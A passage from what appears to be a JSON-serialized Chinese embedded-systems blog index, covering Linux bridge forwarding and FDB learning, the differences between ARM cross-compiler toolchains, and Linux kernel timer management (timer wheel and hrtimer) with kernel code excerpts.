交换机一起动时，桥内部维护的转发信息表（FDB表）是空的。网桥设备每接收到一个报文后，就会根据报文的源MAC地址及报文接收端口，来更新FDB表。 FDB表项的老化： 每个bridge里维护着一份FDB表，里面存着很多表项。为了防止长时间不用的表项及无效的表项占着内存，需要定时的清理这些表项。我们称之为FDB表项的老化。 未知单播：报文进入桥里，在FDB表中没有查到该报文的目的MAC,这时桥就不知道把该报文从哪个具体的端口转发出去。这样的报文就称作未知单播。 泛洪（flood)：网桥处理广播报文及未知单播的方法，即把报文从桥里的每个端口发送一份出去，但不往该报文的源端口发送。 混杂模式：端口的一种状态，端口可以接收目的MAC不是该端口MAC的报文。一般端口默认是只接收目的MAC是该端口MAC的报文，但要进行二层转发，端口是要求接收目的MAC不是该端口的MAC,这时就要把端口模式设置为混杂模式。 二层口：二层口是指只具有二层转发功能的端口。从开发者角度来说，二层口和三层口在内核中都对应了一个net_device，但二层口是没有配置ip地址并且端口设置为混杂模式，并且加入网桥的端口。 如上所述，桥会自己进行MAC学习，来维护一张转发信息表。收到报文后用报文的目的MAC来进行查找，找到相应出端口直接把报文从出端口转发出去。如果是广播报文，就会在整个桥内进行广播，从桥中每个端口发送一份出去（报文源端口除外）。如果查找转发信息表后没找到相应的表项，就在桥内进行泛洪，即从桥中每个端口发送一份出去（报文源端口除外）。这样使连接在每个端口的设备都能收到一份报文，如果相应设备发现是到本节设备的报文，就进行处理。其他设备发现不是到本机的报文，就直接丢弃了。 报文流向图： 二层转发报文 和本机通信的报文 三层转发报文 如上图所示，一台设备创建了两个虚拟bridge。每个bridge里加入了两个二层口。每个bridge会创建一个三层口，用来和三层进行通信。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"arm交叉编译器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi区别","slug":"EMBEDDED/arm交叉编译器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi区别","date":"2016-06-03T03:49:16.000Z","updated":"2017-07-10T08:44:49.052Z","comments":true,"path":"EMBEDDED/arm交叉编译器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/arm交叉编译器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi区别.html","excerpt":"交叉编译工具链的命名规则为：arch [-vendor] [-os] [-(gnu)eabi] arch - 体系架构，如 ARM，MIPS vendor - 工具链提供商 os - 目标操作系统 eabi - 嵌入式应用二进制接口（Emb","text":"交叉编译工具链的命名规则为：arch [-vendor] [-os] [-(gnu)eabi] arch - 体系架构，如 ARM，MIPS vendor - 工具链提供商 os - 目标操作系统 eabi - 嵌入式应用二进制接口（Embedded Application Binary Interface） 根据对操作系统的支持与否，ARM GCC 可分为支持和不支持操作系统，如 arm-none-eabi：这个是没有操作系统的，自然不可能支持那些跟操作系统 关系密切的函数，比如 fork(2)。他使用的是 newlib 这个专用于嵌入式系统 的 C 库。 arm-none-linux-eabi：用于 Linux 的，使用 Glibc 1、arm-none-eabi-gcc （ARM architecture，no vendor，not target an operating system，complies with the ARM EABI） 用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编 译 Linux 应用 Application），一般适合 ARM7、Cortex-M 和 Cortex-R 内核的 芯片使用，所以不支持那些跟操作系统关系密切的函数，比如 fork(2)，他使用 的是 newlib 这个专用于嵌入式系统的 C 库。 2、arm-none-linux-gnueabi-gcc (ARM architecture, no vendor, creates binaries that run on the Linux operating system, and uses the GNU EABI) 主要用于基于 ARM 架构的 Linux 系统，可用于编译 ARM 架构的 u-boot、 Linux 内核、linux 应用等。arm-none-linux-gnueabi 基于 GCC，使用 Glibc 库， 经过 Codesourcery 公司优化过推出的编译器。arm-none-linux-gnueabi-xxx 交 叉编译工具的浮点运算非常优秀。一般 ARM9、ARM11、Cortex-A 内核，带有 Linux 操作系统的会用到。 3、arm-eabi-gcc Android ARM 编译器。 4、armcc ARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序 （u-boot、kernel），但是不能编译 Linux 应用程序。armcc 一般和 ARM 开发 工具一起，Keil MDK、ADS、RVDS 和 DS-5 中的编译器都是 armcc，所以 armcc 编译器都是收费的（爱国版除外，呵呵~~）。 5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc&lt;/span&gt; arm-none-uclinuxeabi 用于 uCLinux，使用 Glibc。 arm-none-symbianelf 用于 symbian，没用过，不知道 C 库是什么 。 Codesourcery 推出的产品叫 Sourcery G++ Lite Edition，其中基于 command-line 的编译器是免费的，在官网上可以下载，而其中包含的 IDE 和 debug 工具是收费的，当然也有 30 天试用版本的。 目前 CodeSourcery 已经由明导国际(Mentor Graphics)收购，所以原本的网站 风格已经全部变为 Mentor 样式，但是 Sourcery G++ Lite Edition 同样可以注 册后免费下载。 Codesourcery 一直是在做 ARM 目标 GCC 的开发和优化，它的 ARM GCC 在 目前在市场上非常优秀，很多 patch 可能还没被 gcc 接受，所以还是应该直接 用它的（而且他提供 Windows 下[mingw 交叉编译的]和 Linux 下的二进制版本， 比较方便；如果不是很有时间和兴趣，不建议下载 src 源码包自己编译，很麻 烦，Codesourcery 给的 shell 脚本很多时候根本没办法直接用，得自行提取关 键的部分手工执行，又费精力又费时间，如果想知道细节，其实不用自己编译 一遍，看看他是用什么步骤构建的即可，如果你对交叉编译器感兴趣的话。 ABI：二进制应用程序接口(Application Binary Interface (ABI) for the ARM Architecture)。在计算机中，应用二进制接口描述了应用程序（或者其他类型） 和操作系统之间或其他应用程序的低级接口。 EABI：嵌入式 ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存 器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。开发者使用 自己的汇编语言也可以使用 EABI 作为与兼容的编译器生成的汇编语言的接口。 两者主要区别是，ABI 是计算机上的，EABI 是嵌入式平台上（如 ARM，MIPS 等）。 两个交叉编译器分别适用于 armel 和 armhf 两个不同的架构，armel 和 armhf 这两种架构在对待浮点运算采取了不同的策略（有 fpu 的 arm 才能支持这两种 浮点运算策略）。 其实这两个交叉编译器只不过是 gcc 的选项 -mfloat-abi 的默认值不同。gcc 的 选项 -mfloat-abi 有三种值 soft、softfp、hard（其中后两者都要求 arm 里有 fpu 浮点运算单元，soft 与后两者是兼容的，但 softfp 和 hard 两种模式互不兼 容）： soft： 不用 fpu 进行浮点计算，即使有 fpu 浮点运算单元也不用，而是使用软 件模式。 softfp： armel 架构（对应的编译器为 arm-linux-gnueabi-gcc ）采用的默认值 用 fpu 计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通 寄存器，中断负荷小，但是参数需要转换成浮点的再计算。 hard： armhf 架构（对应的编译器 arm-linux-gnueabihf-gcc ）采用的默认值， 用 fpu 计算，传参数也用 fpu 中的浮点寄存器传，省去了转换，性能最好，但 是中断负荷高。 把以下测试使用的 C 文件内容保存成 mfloat.c： #include &lt;stdio.h&gt; int main(void) { double a,b,c; a = 23.543; b = 323.234; c = b/a; printf(“the 13/2 = %f\\n”, c); printf(“hello world !\\n”); return 0; } 1、使用 arm-linux-gnueabihf-gcc 编译，使用“-v”选项以获取更详细的信息：&lt;/span&gt; # arm-linux-gnueabihf-gcc -v mfloat.c COLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=hard’ ‘- mfpu=vfpv3-d16′ ‘-mthumb’ -mfloat-abi=hard 可看出使用 hard 硬件浮点模式。 2、使用 arm-linux-gnueabi-gcc 编译：&lt;/span&gt; # arm-linux-gnueabi-gcc -v mfloat.c COLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=softfp’ ‘- mfpu=vfpv3-d16′ ‘-mthumb’ -mfloat-abi=softfp 可看出使用 softfp 模式。 交叉编译工具 交叉编译器 arm-linux-gnueabi 和 arm-linux-gnueabihf 的区别： http://www.cnblogs.com/xiaotlili/p/3306100.html arm-none-linux-gnueabi，arm-none-eabi 与 arm-eabi 区别： http://blog.csdn.net/mantis_1984/article/details/21049273 What’s the difference between arm-linux- / arm-none-linux-gnueabi- / arm-fsl-linux-gnueabi- in LTIB?https://community.freescale.com/thread/313490 &lt;/span&gt; 文章来自 VeryARM：http://www.veryarm.com/296.html，转载请保留。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Linux 时钟管理","slug":"EMBEDDED/Linux 时钟管理","date":"2016-05-27T02:00:20.000Z","updated":"2017-07-10T08:53:22.761Z","comments":true,"path":"EMBEDDED/Linux 时钟管理.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Linux 时钟管理.html","excerpt":"Linux 中的定时器 在 Linux 内核中主要有两种类型的定时器。一类称为 timeout 类型，另一类称为 timer 类型。timeout 类型的定时器通常用于检测各种错误条件，例如用于检测网卡收发数据包是否会超时的定时器，IO 设备的读写是否","text":"Linux 中的定时器 在 Linux 内核中主要有两种类型的定时器。一类称为 timeout 类型，另一类称为 timer 类型。timeout 类型的定时器通常用于检测各种错误条件，例如用于检测网卡收发数据包是否会超时的定时器，IO 设备的读写是否会超时的定时器等等。通常情况下这些错误很少发生，因此，使用 timeout 类型的定时器一般在超时之前就会被移除，从而很少产生真正的函数调用和系统开销。总的来说，使用 timeout 类型的定时器产生的系统开销很小，它是下文提及的 timer wheel 通常使用的环境。此外，在使用 timeout 类型定时器的地方往往并不关心超时处理，因此超时精确与否，早 0.01 秒或者晚 0.01 秒并不十分重要，这在下文论述 deferrable timers 时会进一步介绍。timer 类型的定时器与 timeout 类型的定时器正相反，使用 timer 类型的定时器往往要求在精确的时钟条件下完成特定的事件，通常是周期性的并且依赖超时机制进行处理。例如设备驱动通常会定时读写设备来进行数据交互。如何高效的管理 timer 类型的定时器对提高系统的处理效率十分重要，下文在介绍 hrtimer 时会有更加详细的论述。 内核需要进行时钟管理，离不开底层的硬件支持。在早期是通过 8253 芯片提供的 PIT（Programmable Interval Timer）来提供时钟，但是 PIT 的频率很低，只能提供最高 1ms 的时钟精度，由于 PIT 触发的中断速度太慢，会导致很大的时延，对于像音视频这类对时间精度要求更高的应用并不足够，会极大的影响用户体验。随着硬件平台的不断发展变化，陆续出现了 TSC（Time Stamp Counter），HPET（High Precision Event Timer），ACPI PM Timer（ACPI Power Management Timer），CPU Local APIC Timer 等精度更高的时钟。这些时钟陆续被 Linux 的时钟子系统所采纳，从而不断的提高 Linux 时钟子系统的性能和灵活性。这些不同的时钟会在下文不同的章节中分别进行介绍。 回页首 Timer wheel 在 Linux 2.6.16 之前，内核一直使用一种称为 timer wheel 的机制来管理时钟。这就是熟知的 kernel 一直采用的基于 HZ 的 timer 机制。Timer wheel 的核心数据结构如清单 1 所示： 清单 1. Timer wheel 的核心数据结构 #define TVN_BITS (CONFIG_BASE_SMALL ? 4 : 6) #define TVR_BITS (CONFIG_BASE_SMALL ? 6 : 8) #define TVN_SIZE (1 &lt;&lt; TVN_BITS) #define TVR_SIZE (1 &lt;&lt; TVR_BITS) #define TVN_MASK (TVN_SIZE - 1) #define TVR_MASK (TVR_SIZE - 1) struct tvec { struct list_head vec[TVN_SIZE]; }; struct tvec_root { struct list_head vec[TVR_SIZE]; }; struct tvec_base { spinlock_t lock; struct timer_list *running_timer; unsigned long timer_jiffies; unsigned long next_timer; struct tvec_root tv1; struct tvec tv2; struct tvec tv3; struct tvec tv4; struct tvec tv5; } ____cacheline_aligned; 以 CONFIG_BASE_SMALL 定义为 0 为例，TVR_SIZE ＝ 256，TVN_SIZE ＝ 64，这样 可以得到如图 1 所示的 timer wheel 的结构。 图 1. Timer wheel 的逻辑结构 list_head的作用list_head 是 Linux 内核使用的一个双向循环链表表头。任何一个需要使用链表的数据结构可以通过内嵌 list_head 的方式，将其链接在一起从而形成一个双向链表。参见 list_head 在 include/Linux/list.h 中的定义和实现。 在 timer wheel 的框架下，所有系统正在使用的 timer 并不是顺序存放在一个平坦的链表中，因为这样做会使得查找，插入，删除等操作效率低下。Timer wheel 提供了 5 个 timer 数组，数组之间存在着类似时分秒的进位关系。TV1 为第一个 timer 数组，其中存放着从 timer_jiffies（当前到期的 jiffies）到 timer_jiffies + 255 共 256 个 tick 对应的 timer list。因为在一个 tick 上可能同时有多个 timer 等待超时处理，timer wheel 使用 list_head 将所有 timer 串成一个链表，以便在超时时顺序处理。TV2 有 64 个单元，每个单元都对应着 256 个 tick，因此 TV2 所表示的超时时间范围从 timer_jiffies + 256 到 timer_jiffies + 256 * 64 – 1。依次类推 TV3，TV4，TV5。以 HZ=1000 为例，每 1ms 产生一次中断，TV1 就会被访问一次，但是 TV2 要每 256ms 才会被访问一次，TV3 要 16s，TV4 要 17 分钟，TV5 甚至要 19 小时才有机会检查一次。最终，timer wheel 可以管理的最大超时值为 2^32。一共使用了 512 个 list_head（256+64+64+64+64）。如果 CONFIG_BASE_SMALL 定义为 1，则最终使用的 list_head 个数为 128 个（64+16+16+16+16），占用的内存更少，更适合嵌入式系统使用。Timer wheel 的处理逻辑如清单 2 所示： 清单 2. timer wheel 的核心处理函数 static inline void __run_timers(struct tvec_base *base) { struct timer_list *timer; spin_lock_irq(&amp;base-&gt;lock); while (time_after_eq(jiffies, base-&gt;timer_jiffies)) { struct list_head work_list; struct list_head *head = &amp;work_list; int index = base-&gt;timer_jiffies &amp; TVR_MASK; /* * Cascade timers: */ if (!index &amp;&amp; (!cascade(base, &amp;base-&gt;tv2, INDEX(0))) &amp;&amp; (!cascade(base, &amp;base-&gt;tv3, INDEX(1))) &amp;&amp; !cascade(base, &amp;base-&gt;tv4, INDEX(2))) cascade(base, &amp;base-&gt;tv5, INDEX(3)); ++base-&gt;timer_jiffies; list_replace_init(base-&gt;tv1.vec + index, &amp;work_list); while (!list_empty(head)) { void (*fn)(unsigned long); unsigned long data; timer = list_first_entry(head, struct timer_list,entry); fn = timer-&gt;function; data = timer-&gt;data; . . . . fn(data); . . . . } base-&gt;timer_jiffies 用来记录在 TV1 中最接近超时的 tick 的位置。index 是用来遍历 TV1 的索引。每一次循环 index 会定位一个当前待处理的 tick，并处理这个 tick 下所有超时的 timer。base-&gt;timer_jiffies 会在每次循环后增加一个 jiffy，index 也会随之向前移动。当 index 变为 0 时表示 TV1 完成了一次完整的遍历，此时所有在 TV1 中的 timer 都被处理了，因此需要通过 cascade 将后面 TV2，TV3 等 timer list 中的 timer 向前移动，类似于进位。这种层叠的 timer list 实现机制可以大大降低每次检查超时 timer 的时间，每次中断只需要针对 TV1 进行检查，只有必要时才进行 cascade。即便如此，timer wheel 的实现机制仍然存在很大弊端。一个弊端就是 cascade 开销过大。在极端的条件下，同时会有多个 TV 需要进行 cascade 处理，会产生很大的时延。这也是为什么说 timeout 类型的定时器是 timer wheel 的主要应用环境，或者说 timer wheel 是为 timeout 类型的定时器优化的。因为 timeout 类型的定时器的应用场景多是错误条件的检测，这类错误发生的机率很小，通常不到超时就被删除了，因此不会产生 cascade 的开销。另一方面，由于 timer wheel 是建立在 HZ 的基础上的，因此其计时精度无法进一步提高。毕竟一味的通过提高 HZ 值来提高计时精度并无意义，结果只能是产生大量的定时中断，增加额外的系统开销。因此，有必要将高精度的 timer 与低精度的 timer 分开，这样既可以确保低精度的 timeout 类型的定时器应用，也便于高精度的 timer 类型定时器的应用。还有一个重要的因素是 timer wheel 的实现与 jiffies 的耦合性太强，非常不便于扩展。因此，自从 2.6.16 开始，一个新的 timer 子系统 hrtimer 被加入到内核中。 回页首 hrtimer (High-resolution Timer) hrtimer 首先要实现的功能就是要克服 timer wheel 的缺点：低精度以及与内核其他模块的高耦合性。在正式介绍 hrtimer 之前，有必要先介绍几个常用的基本概念： 时钟源设备（clock-source device） 系统中可以提供一定精度的计时设备都可以作为时钟源设备。如 TSC，HPET，ACPI PM-Timer，PIT 等。但是不同的时钟源提供的时钟精度是不一样的。像 TSC，HPET 等时钟源既支持高精度模式（high-resolution mode）也支持低精度模式（low-resolution mode），而 PIT 只能支持低精度模式。此外，时钟源的计时都是单调递增的（monotonically），如果时钟源的计时出现翻转（即返回到 0 值），很容易造成计时错误， 内核的一个 patch（commit id: ff69f2）就是处理这类问题的一个很好示例。时钟源作为系统时钟的提供者，在可靠并且可用的前提下精度越高越好。在 Linux 中不同的时钟源有不同的 rating，具有更高 rating 的时钟源会优先被系统使用。如图 2 所示： 表 1. 时钟源中 rating 的定义 1 ~ 99100 ~ 199200 ~ 299300 ~ 399400 ~ 499非常差的时钟源，只能作为最后的选择。如 jiffies基本可以使用但并非理想的时钟源。如 PIT正确可用的时钟源。如 ACPI PM Timer，HPET快速并且精确的时钟源。如 TSC理想时钟源。如 kvm_clock，xen_clock 时钟事件设备（clock-event device） 系统中可以触发 one-shot（单次）或者周期性中断的设备都可以作为时钟事件设备。如 HPET，CPU Local APIC Timer 等。HPET 比较特别，它既可以做时钟源设备也可以做时钟事件设备。时钟事件设备的类型分为全局和 per-CPU 两种类型。全局的时钟事件设备虽然附属于某一个特定的 CPU 上，但是完成的是系统相关的工作，例如完成系统的 tick 更新；per-CPU 的时钟事件设备主要完成 Local CPU 上的一些功能，例如对在当前 CPU 上运行进程的时间统计，profile，设置 Local CPU 上的下一次事件中断等。和时钟源设备的实现类似，时钟事件设备也通过 rating 来区分优先级关系。 tick device Tick device 用来处理周期性的 tick event。Tick device 其实是时钟事件设备的一个 wrapper，因此 tick device 也有 one-shot 和周期性这两种中断触发模式。每注册一个时钟事件设备，这个设备会自动被注册为一个 tick device。全局的 tick device 用来更新诸如 jiffies 这样的全局信息，per-CPU 的 tick device 则用来更新每个 CPU 相关的特定信息。 broadcast CPU 的 C-STATE CPU 在空闲时会根据空闲时间的长短选择进入不同的睡眠级别，称为 C-STATE。C0 为正常运行状态，C1 到 C7 为睡眠状态，数值越大，睡眠程度越深，也就越省电。CPU 空闲越久，进入睡眠的级别越高，但是唤醒所需的时间也越长。唤醒也是需要消耗能源的，因此，只有选择合适的睡眠级别才能确保节能的最大化。 Broadcast 的出现是为了应对这样一种情况：假定 CPU 使用 Local APIC Timer 作为 per-CPU 的 tick device，但是某些特定的 CPU（如 Intel 的 Westmere 之前的 CPU）在进入 C3+ 的状态时 Local APIC Timer 也会同时停止工作，进入睡眠状态。在这种情形下 broadcast 可以替代 Local APIC Timer 继续完成统计进程的执行时间等有关操作。本质上 broadcast 是发送一个 IPI（Inter-processor interrupt）中断给其他所有的 CPU，当目标 CPU 收到这个 IPI 中断后就会调用原先 Local APIC Timer 正常工作时的中断处理函数，从而实现了同样的功能。目前主要在 x86 以及 MIPS 下会用到 broadcast 功能。 Timekeeping &amp; GTOD (Generic Time-of-Day) Timekeeping（可以理解为时间测量或者计时）是内核时间管理的一个核心组成部分。没有 Timekeeping，就无法更新系统时间，维持系统“心跳“。GTOD 是一个通用的框架，用来实现诸如设置系统时间 gettimeofday 或者修改系统时间 settimeofday 等工作。为了实现以上功能，Linux 实现了多种与时间相关但用于不同目的的数据结构。 struct timespec { __kernel_time_t tv_sec; / seconds / long tv_nsec; / nanoseconds / }; timespec 精度是纳秒。它用来保存从 00:00:00 GMT, 1 January 1970 开始经过的时间。内核使用全局变量 xtime 来记录这一信息，这就是通常所说的“Wall Time”或者“Real Time”。与此对应的是“System Time”。System Time 是一个单调递增的时间，每次系统启动时从 0 开始计时。 struct timeval { __kernel_time_t tv_sec; / seconds / __kernel_suseconds_t tv_usec; / microseconds / }; timeval 精度是微秒。timeval 主要用来指定一段时间间隔。 union ktime { s64 tv64; #if BITS_PER_LONG != 64 &amp;&amp; !defined(CONFIG_KTIME_SCALAR) struct { # ifdef __BIG_ENDIAN s32 sec, nsec; # else s32 nsec, sec; # endif } tv; #endif }; ktime_t 是 hrtimer 主要使用的时间结构。无论使用哪种体系结构，ktime_t 始终保持 64bit 的精度，并且考虑了大小端的影响。 typedef u64 cycle_t; cycle_t 是从时钟源设备中读取的时钟类型。 为了管理这些不同的时间结构，Linux 实现了一系列辅助函数来完成相互间的转换。 ktime_to_timespec，ktime_to_timeval，ktime_to_ns/ktime_to_us，反过来有诸如 ns_to_ktime 等类似的函数。 timeval_to_ns，timespec_to_ns，反过来有诸如 ns_to_timeval 等类似的函数。 timeval_to_jiffies，timespec_to_jiffies，msecs_to_jiffies, usecs_to_jiffies, clock_t_to_jiffies 反过来有诸如 ns_to_timeval 等类似的函数。 clocksource_cyc2ns / cyclecounter_cyc2ns 有了以上的介绍，通过图 3 可以更加清晰的看到这几者之间的关联。 图 2. 内核时钟子系统的结构关系 时钟源设备和时钟事件设备的引入，将原本放在各个体系结构中重复实现的冗余代码封装到各自的抽象层中，这样做不但消除了原来 timer wheel 与内核其他模块的紧耦合性，更重要的是系统可以在运行状态动态更换时钟源设备和时钟事件设备而不影响系统正常使用，譬如当 CPU 由于睡眠要关闭当前使用的时钟源设备或者时钟事件设备时系统可以平滑的切换到其他仍处于工作状态的设备上。Timekeeping/GTOD 在使用时钟源设备的基础上也采用类似的封装实现了体系结构的无关性和通用性。hrtimer 则可以通过 timekeeping 提供的接口完成定时器的更新，通过时钟事件设备提供的事件机制，完成对 timer 的管理。在图 3 中还有一个重要的模块就是 tick device 的抽象，尤其是 dynamic tick。Dynamic tick 的出现是为了能在系统空闲时通过停止 tick 的运行以达到降低 CPU 功耗的目的。使用 dynamic tick 的系统，只有在有实际工作时才会产生 tick，否则 tick 是处于停止状态。下文会有专门的章节进行论述。 hrtimer 的实现机制 hrtimer 是建立在 per-CPU 时钟事件设备上的，对于一个 SMP 系统，如果只有全局的时钟事件设备，hrtimer 无法工作。因为如果没有 per-CPU 时钟事件设备，时钟中断发生时系统必须产生必要的 IPI 中断来通知其他 CPU 完成相应的工作，而过多的 IPI 中断会带来很大的系统开销，这样会令使用 hrtimer 的代价太大，不如不用。为了支持 hrtimer，内核需要配置 CONFIG_HIGH_RES_TIMERS=y。hrtimer 有两种工作模式：低精度模式（low-resolution mode）与高精度模式（high-resolution mode）。虽然 hrtimer 子系统是为高精度的 timer 准备的，但是系统可能在运行过程中动态切换到不同精度的时钟源设备，因此，hrtimer 必须能够在低精度模式与高精度模式下自由切换。由于低精度模式是建立在高精度模式之上的，因此即便系统只支持低精度模式，部分支持高精度模式的代码仍然会编译到内核当中。 在低精度模式下，hrtimer 的核心处理函数是 hrtimer_run_queues，每一次 tick 中断都要执行一次。如清单 3 所示。这个函数的调用流程为： update_process_times run_local_timers hrtimer_run_queues raise_softirq(TIMER_SOFTIRQ) 清单 3. 低精度模式下 hrtimer 的核心处理函数 void hrtimer_run_queues(void) { struct rb_node *node; struct hrtimer_cpu_base *cpu_base = &amp;__get_cpu_var(hrtimer_bases); struct hrtimer_clock_base *base; int index, gettime = 1; if (hrtimer_hres_active()) return; for (index = 0; index &lt; HRTIMER_MAX_CLOCK_BASES; index++) { base = &amp;cpu_base-&gt;clock_base[index]; if (!base-&gt;first) continue; if (gettime) { hrtimer_get_softirq_time(cpu_base); gettime = 0; } raw_spin_lock(&amp;cpu_base-&gt;lock); while ((node = base-&gt;first)) { struct hrtimer *timer; timer = rb_entry(node, struct hrtimer, node); if (base-&gt;softirq_time.tv64 &lt;= hrtimer_get_expires_tv64(timer)) break; __run_hrtimer(timer, &amp;base-&gt;softirq_time); } raw_spin_unlock(&amp;cpu_base-&gt;lock); } } hrtimer_bases 是实现 hrtimer 的核心数据结构，通过 hrtimer_bases，hrtimer 可以管理挂在每一个 CPU 上的所有 timer。每个 CPU 上的 timer list 不再使用 timer wheel 中多级链表的实现方式，而是采用了红黑树（Red-Black Tree）来进行管理。hrtimer_bases 的定义如清单 4 所示： 清单 4. hrtimer_bases 的定义 DEFINE_PER_CPU(struct hrtimer_cpu_base, hrtimer_bases) = { .clock_base = { { .index = CLOCK_REALTIME, .get_time = &amp;ktime_get_real, .resolution = KTIME_LOW_RES, }, { .index = CLOCK_MONOTONIC, .get_time = &amp;ktime_get, .resolution = KTIME_LOW_RES, }, } }; 图 4 展示了 hrtimer 如何通过 hrtimer_bases 来管理 timer。 图 3. hrtimer 的时钟管理 每个 hrtimer_bases 都包含两个 clock_base，一个是 CLOCK_REALTIME 类型的，另一个是 CLOCK_MONOTONIC 类型的。hrtimer 可以选择其中之一来设置 timer 的 expire time, 可以是实际的时间 , 也可以是相对系统运行的时间。 在 hrtimer_run_queues 的处理中，首先要通过 hrtimer_bases 找到正在执行当前中断的 CPU 相关联的 clock_base，然后逐个检查每个 clock_base 上挂的 timer 是否超时。由于 timer 在添加到 clock_base 上时使用了红黑树，最早超时的 timer 被放到树的最左侧，因此寻找超时 timer 的过程非常迅速，找到的所有超时 timer 会被逐一处理。超时的 timer 根据其类型分为 softIRQ / per-CPU / unlocked 几种。如果一个 timer 是 softIRQ 类型的，这个超时的 timer 需要被转移到 hrtimer_bases 的 cb_pending 的 list 上，待 IRQ0 的软中断被激活后，通过 run_hrtimer_pending 执行，另外两类则必须在 hardIRQ 中通过 __run_hrtimer 直接执行。不过在较新的 kernel（&gt; 2.6.29）中，cb_pending 被取消，这样所有的超时 timers 都必须在 hardIRQ 的 context 中执行。这样修改的目的，一是为了简化代码逻辑，二是为了减少 2 次 context 的切换：一次从 hardIRQ 到 softIRQ，另一次从 softIRQ 到被超时 timer 唤醒的进程。 在 update_process_times 中，除了处理处于低精度模式的 hrtimer 外，还要唤醒 IRQ0 的 softIRQ（TIMER_SOFTIRQ（run_timer_softirq））以便执行 timer wheel 的代码。由于 hrtimer 子系统的加入，在 IRQ0 的 softIRQ 中，还需要通过 hrtimer_run_pending 检查是否可以将 hrtimer 切换到高精度模式，如清单 5 所示： 清单 5. hrtimer 进行精度切换的处理函数 void hrtimer_run_pending(void) { if (hrtimer_hres_active()) return; /* * This is ugly: We have to check in the softirq context, * whether we can switch to highres and / or nohz mode. The * clocksource switch happens in the timer interrupt with * xtime_lock held. Notification from there only sets the * check bit in the tick_oneshot code, otherwise we might * deadlock vs. xtime_lock. */ if (tick_check_oneshot_change(!hrtimer_is_hres_enabled())) hrtimer_switch_to_hres(); } 正如这段代码的作者注释中所提到的，每一次触发 IRQ0 的 softIRQ 都需要检查一次是否可以将 hrtimer 切换到高精度，显然是十分低效的，希望将来有更好的方法不用每次都进行检查。 如果可以将 hrtimer 切换到高精度模式，则调用 hrtimer_switch_to_hres 函数进行切换。如清单 6 所示： 清单 6. hrtimer 切换到高精度模式的核心函数 /* * Switch to high resolution mode */ static int hrtimer_switch_to_hres(void) { int cpu = smp_processor_id(); struct hrtimer_cpu_base *base = &amp;per_cpu(hrtimer_bases, cpu); unsigned long flags; if (base-&gt;hres_active) return 1; local_irq_save(flags); if (tick_init_highres()) { local_irq_restore(flags); printk(KERN_WARNING “Could not switch to high resolution “ “mode on CPU %d\\n”, cpu); return 0; } base-&gt;hres_active = 1; base-&gt;clock_base[CLOCK_REALTIME].resolution = KTIME_HIGH_RES; base-&gt;clock_base[CLOCK_MONOTONIC].resolution = KTIME_HIGH_RES; tick_setup_sched_timer(); / “Retrigger” the interrupt to get things going / retrigger_next_event(NULL); local_irq_restore(flags); return 1; } hrtimer_interrupt的使用环境hrtimer_interrupt 有 2 种常见的使用方式。一是作为 tick 的推动器在产生 tick 中断时被调用；另一种情况就是通过软中断 HRTIMER_SOFTIRQ（run_hrtimer_softirq）被调用，通常是被驱动程序或者间接的使用这些驱动程序的用户程序所调用 在这个函数中，首先使用 tick_init_highres 更新与原来的 tick device 绑定的时钟事件设备的 event handler，例如将在低精度模式下的工作函数 tick_handle_periodic / tick_handle_periodic_broadcast 换成 hrtimer_interrupt（它是 hrtimer 在高精度模式下的 timer 中断处理函数），同时将 tick device 的触发模式变为 one-shot，即单次触发模式，这是使用 dynamic tick 或者 hrtimer 时 tick device 的工作模式。由于 dynamic tick 可以随时停止和开始，以不规律的速度产生 tick，因此支持 one-shot 模式的时钟事件设备是必须的；对于 hrtimer，由于 hrtimer 采用事件机制驱动 timer 前进，因此使用 one-shot 的触发模式也是顺理成章的。不过这样一来，原本 tick device 每次执行中断时需要完成的周期性任务如更新 jiffies / wall time (do_timer) 以及更新 process 的使用时间（update_process_times）等工作在切换到高精度模式之后就没有了，因此在执行完 tick_init_highres 之后紧接着会调用 tick_setup_sched_timer 函数来完成这部分设置工作，如清单 7 所示： 清单 7. hrtimer 高精度模式下模拟周期运行的 tick device 的简化实现 void tick_setup_sched_timer(void) { struct tick_sched *ts = &amp;__get_cpu_var(tick_cpu_sched); ktime_t now = ktime_get(); u64 offset; /* * Emulate tick processing via per-CPU hrtimers: */ hrtimer_init(&amp;ts-&gt;sched_timer, CLOCK_MONOTONIC, HRTIMER_MODE_ABS); ts-&gt;sched_timer.function = tick_sched_timer; . . . . for (;;) { hrtimer_forward(&amp;ts-&gt;sched_timer, now, tick_period); hrtimer_start_expires(&amp;ts-&gt;sched_timer, HRTIMER_MODE_ABS_PINNED); / Check, if the timer was already in the past / if (hrtimer_active(&amp;ts-&gt;sched_timer)) break; now = ktime_get(); } . . . . } 这个函数使用 tick_cpu_sched 这个 per-CPU 变量来模拟原来 tick device 的功能。tick_cpu_sched 本身绑定了一个 hrtimer，这个 hrtimer 的超时值为下一个 tick，回调函数为 tick_sched_timer。因此，每过一个 tick，tick_sched_timer 就会被调用一次，在这个回调函数中首先完成原来 tick device 的工作，然后设置下一次的超时值为再下一个 tick，从而达到了模拟周期运行的 tick device 的功能。如果所有的 CPU 在同一时间点被唤醒，并发执行 tick 时可能会出现 lock 竞争以及 cache-line 冲突，为此 Linux 内核做了特别处理：如果假设 CPU 的个数为 N，则所有的 CPU 都在 